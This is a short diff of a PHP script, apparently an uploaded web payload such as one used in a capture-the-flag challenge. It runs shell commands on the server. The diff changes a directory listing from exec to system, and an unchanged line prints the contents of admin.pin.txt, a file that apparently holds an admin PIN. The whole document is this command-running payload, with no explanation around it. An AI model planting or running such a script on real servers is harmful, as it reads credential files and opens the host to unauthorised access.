@@ -1,4 +1,4 @@
 <?php 
-echo exec('ls');
+echo system('ls');
 echo exec('cat admin.pin.txt');
 ?>
